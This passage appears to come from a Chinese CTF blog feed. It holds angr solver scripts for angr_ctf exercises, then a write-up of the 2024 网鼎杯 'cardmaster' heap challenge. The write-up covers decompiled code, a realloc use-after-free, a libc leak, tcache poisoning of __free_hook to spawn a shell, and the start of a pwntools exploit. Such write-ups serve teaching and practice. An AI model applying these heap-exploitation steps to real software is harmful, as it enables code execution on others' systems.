punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#ZXIDRXEORJOTFFJNWUFAOUBLOGLQCCGK</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="10-angr-simprocedures"><a href="#10-angr-simprocedures" class="headerlink" title="10_angr_simprocedures"></a>10_angr_simprocedures</h3><p>判断函数调用了很多次，所以不能直接通过设置地址来 hook，而需要通过函数名来 hook，也就是使用 <code>hook_symbol</code> 通过函数名 hook 到类中的 run 函数，run 一参是 self，其他参数可以直接用判断函数的参数，加载地址也需要用 self.state</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./10_angr_simprocedures'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">func</span><span class="token punctuation">(</span>angr<span class="token punctuation">.</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span>        <span class="token keyword">return</span> claripy<span class="token punctuation">.</span>If<span class="token punctuation">(</span>res <span class="token operator">==</span> <span class="token string">'ORSDDWXHZURJRBDH'</span><span class="token punctuation">,</span> claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span> claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>project<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span><span class="token string">'check_equals_ORSDDWXHZURJRBDH'</span><span class="token punctuation">,</span> func<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#MSWKNJNAVTTOZMRY</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="11-angr-sim-scanf"><a href="#11-angr-sim-scanf" class="headerlink" title="11_angr_sim_scanf"></a>11_angr_sim_scanf</h3><p>hook scanf函数来应对复杂格式的输入，向scanf的参数中存入内容，并且将值存到 globals 全局变量插件中</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./11_angr_sim_scanf'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">func</span><span class="token punctuation">(</span>angr<span class="token punctuation">.</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> format_string<span class="token punctuation">,</span> param0<span class="token punctuation">,</span> param1<span class="token punctuation">)</span><span class="token punctuation">:</span>        arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>        arg2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg2'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>param0<span class="token punctuation">,</span> arg1<span class="token punctuation">,</span> endness <span class="token operator">=</span> <span class="token string">'LE'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>param1<span class="token punctuation">,</span> arg2<span class="token punctuation">,</span> endness <span class="token operator">=</span> <span class="token string">'LE'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'solutions'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> arg2<span class="token punctuation">)</span>project<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span><span class="token string">'__isoc99_scanf'</span><span class="token punctuation">,</span> func<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    stored_solutions <span class="token operator">=</span> solution_state<span class="token punctuation">.</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'solutions'</span><span class="token punctuation">]</span>    scanf0_solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>stored_solutions<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    scanf1_solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>stored_solutions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>scanf0_solution<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>scanf1_solution<span class="token punctuation">)</span><span class="token comment">#1448564819</span><span class="token comment">#1398294103</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;angr基础知识&quot;&gt;&lt;a href=&quot;#angr基础知识&quot; class=&quot;headerlink&quot; title=&quot;angr基础知识&quot;&gt;&lt;/a&gt;angr基础知识&lt;/h2&gt;&lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="angr" scheme="https://starrysky1004.github.io/categories/angr/"/>
    
    
    <category term="angr" scheme="https://starrysky1004.github.io/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>2024网鼎杯cardmaster</title>
    <link href="https://starrysky1004.github.io/2024/12/04/2024-wang-ding-bei-cardmaster/2024-wang-ding-bei-cardmaster/"/>
    <id>https://starrysky1004.github.io/2024/12/04/2024-wang-ding-bei-cardmaster/2024-wang-ding-bei-cardmaster/</id>
    <published>2024-12-03T16:21:58.000Z</published>
    <updated>2024-12-03T16:41:47.959Z</updated>
    
    <content type="html"><![CDATA[<p>视频版：<a href="https://www.bilibili.com/video/BV1p8BoYPEae">https://www.bilibili.com/video/BV1p8BoYPEae</a></p><p>程序使用<code>rand</code>函数模拟洗牌，同时可以通过程序设置、获取卡牌信息，也可以重新初始化或进行随机，考察点是<code>2.27</code>使用<code>realloc</code>造成的<code>uaf</code>，同时在管理结构中存在<code>get</code>功能的函数指针，攻击思路就是利用<code>uaf</code>修改函数指针为<code>ogg</code>从而<code>getshell</code></p><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><h3 id="init-card"><a href="#init-card" class="headerlink" title="init_card"></a>init_card</h3><p>初始化卡牌，创建了<code>card_manager</code>和<code>heap_manager</code>并进行相关初始化</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">_QWORD <span class="token operator">*</span><span class="token function">init_card</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span>current_heap<span class="token punctuation">;</span> <span class="token comment">// rbx</span>  <span class="token keyword">int</span> index<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-1Ch]</span>  manager <span class="token operator">*</span>card_manager<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-18h]</span>  card_manager <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x28uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  card_manager<span class="token operator">-></span>heap_manager <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> index <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token operator">++</span>index <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    current_heap <span class="token operator">=</span> <span class="token operator">&amp;</span>card_manager<span class="token operator">-></span>heap_manager<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">*</span>current_heap <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xD0uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">12</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>card_manager<span class="token operator">-></span>heap_manager<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x10LL</span> <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> index<span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>card_manager<span class="token operator">-></span>heap_manager<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x10LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// 1-13</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  card_manager<span class="token operator">-></span>card_len <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>  card_manager<span class="token operator">-></span>heap_size <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">;</span>  card_manager<span class="token operator">-></span>card <span class="token operator">=</span> card<span class="token punctuation">;</span>  card_manager<span class="token operator">-></span>func <span class="token operator">=</span> output_func<span class="token punctuation">;</span>  card_manager<span class="token operator">-></span>random_level <span class="token operator">=</span> <span class="token number">0x3E8LL</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">&amp;</span>card_manager<span class="token operator">-></span>card_len<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中<code>card_manager</code>的结构体如下，存在<code>card</code>、<code>func</code>、<code>heap_manager</code>三个指针和<code>card_len</code>、<code>heap_size</code>、<code>random_level</code>三个参数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">00000000</span> <span class="token keyword">struct</span> <span class="token class-name">manager</span> <span class="token comment">// sizeof=0x28</span><span class="token number">00000000</span> <span class="token punctuation">&#123;</span><span class="token number">00000000</span>     <span class="token keyword">unsigned</span> __int32 card_len<span class="token punctuation">;</span><span class="token number">00000004</span>     <span class="token keyword">unsigned</span> __int32 heap_size<span class="token punctuation">;</span><span class="token number">00000008</span>     <span class="token keyword">unsigned</span> __int64 random_level<span class="token punctuation">;</span><span class="token number">00000010</span>     <span class="token keyword">unsigned</span> __int64 card<span class="token punctuation">;</span><span class="token number">00000018</span>     <span class="token keyword">unsigned</span> __int64 func<span class="token punctuation">;</span><span class="token number">00000020</span>     <span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span>heap_manager<span class="token punctuation">;</span><span class="token number">00000028</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>card</code>指针指向的地址中存在卡牌的所有花色，花色的种类数量是<code>card_len</code>，初始值为<code>4</code>，初始花色是<code>data</code>段的<code>♥♠♦♣</code></li><li><code>heap_manager</code>指向堆管理地址，保存了卡牌的位置和花色，初始堆的数量是<code>13</code>，每个堆的大小等于<code>heap_size * 0x10</code></li><li><code>random_level</code>设置了随机化等级，在后续随机化函数会用到，初始值为<code>0x3e8</code></li><li><code>func</code>指向一个输出函数，初始值是程序段的<code>output_func</code></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">output_func</span><span class="token punctuation">(</span>manager <span class="token operator">*</span>manager<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"suit count is %d\n"</span><span class="token punctuation">,</span> manager<span class="token operator">-></span>card_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"digit range: 1 - %d\n"</span><span class="token punctuation">,</span> manager<span class="token operator">-></span>heap_size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"suit chara set:%s\n"</span><span class="token punctuation">,</span> manager<span class="token operator">-></span>card<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"randomize level:%lld\n"</span><span class="token punctuation">,</span> manager<span class="token operator">-></span>random_level<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p><code>set</code>函数由用户自定义了卡牌信息</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> __fastcall <span class="token function">set</span><span class="token punctuation">(</span>manager <span class="token operator">*</span>card_manager<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span>current_heap<span class="token punctuation">;</span> <span class="token comment">// rbx</span>  <span class="token class-name">ssize_t</span> result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">int</span> index<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h]</span>  <span class="token keyword">signed</span> __int32 i<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-1Ch]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>card_address<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-18h]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"suit count:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> card_manager<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"digit range 1 - ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>card_manager<span class="token operator">-></span>heap_size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"randomize level:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%lld"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>card_manager<span class="token operator">-></span>random_level<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> card_manager<span class="token operator">-></span>card <span class="token operator">==</span> card <span class="token punctuation">)</span>    card_address <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> card_manager<span class="token operator">-></span>card_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    card_address <span class="token operator">=</span> <span class="token function">realloc</span><span class="token punctuation">(</span>card_manager<span class="token operator">-></span>card<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token operator">*</span> card_manager<span class="token operator">-></span>card_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  card_manager<span class="token operator">-></span>heap_manager <span class="token operator">=</span> <span class="token function">realloc</span><span class="token punctuation">(</span>card_manager<span class="token operator">-></span>heap_manager<span class="token punctuation">,</span> <span class="token number">8LL</span> <span class="token operator">*</span> card_manager<span class="token operator">-></span>card_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>index <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    result <span class="token operator">=</span> card_manager<span class="token operator">-></span>card_len<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> index <span class="token operator">>=</span> result <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> card_manager<span class="token operator">-></span>heap_size<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>result <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    current_heap <span class="token operator">=</span> <span class="token operator">&amp;</span>card_manager<span class="token operator">-></span>heap_manager<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">*</span>current_heap <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">16LL</span> <span class="token operator">*</span> card_manager<span class="token operator">-></span>heap_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> card_manager<span class="token operator">-></span>heap_size<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>card_manager<span class="token operator">-></span>heap_manager<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16LL</span> <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> index<span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>card_manager<span class="token operator">-></span>heap_manager<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> card_address <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    card_manager<span class="token operator">-></span>card <span class="token operator">=</span> card_address<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"new suite set:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> card_manager<span class="token operator">-></span>card<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token operator">*</span> card_manager<span class="token operator">-></span>card_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>由用户输入了<code>card_len</code>、<code>heap_size</code>、<code>random_level</code></li><li>创建<code>card</code>堆块<ul><li>当前<code>card_manager</code>中的<code>card</code>值与<code>data</code>段的<code>card</code>值相同的时候使用<code>malloc</code>创建长度为<code>4 * card_len</code>的<code>card</code>堆块</li><li>不同的时候使用<code>realloc</code>调整堆块的大小为<code>4 * card_len</code></li></ul></li><li>使用<code>realloc</code>调整堆管理结构大小为<code>8 * card_len</code></li><li>循环创建数量为<code>card_len</code>的堆块，堆块大小为输入的<code>heap_size</code>，并且在堆块中存放位置和花色</li><li>设置<code>card_manager</code>中的<code>card</code>的地址为创建的<code>card</code>堆块地址</li></ul><p>其中<code>realloc</code>在<code>card_len</code>为<code>0</code>的时候存在<code>uaf</code>漏洞</p><h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><p>该功能调用的<code>card_manager</code>中的<code>func</code>函数对堆中的内容进行输出，包括<code>card_len</code>、<code>heap_size</code>、<code>card</code>内容、<code>random_level</code>，其中<code>card</code>可修改为堆指针，存在内存泄露</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                                   <span class="token comment">// get</span>        <span class="token punctuation">(</span>card_manager<span class="token operator">-></span>func<span class="token punctuation">)</span><span class="token punctuation">(</span>card_manager<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h2><p>在<code>set</code>的时候控制堆大小进而控制<code>card</code>为一个大堆块，再将<code>size</code>设置为<code>0</code>释放后进入<code>unsorted bin</code>，通过<code>get</code>函数泄露出<code>libc</code>地址，再进行<code>tcache bin attack</code>，当<code>calloc</code>的<code>size</code>和堆大小相同时相当于<code>edit</code>，利用这一点改<code>tcache bin</code>中的地址为<code>free_hook</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token 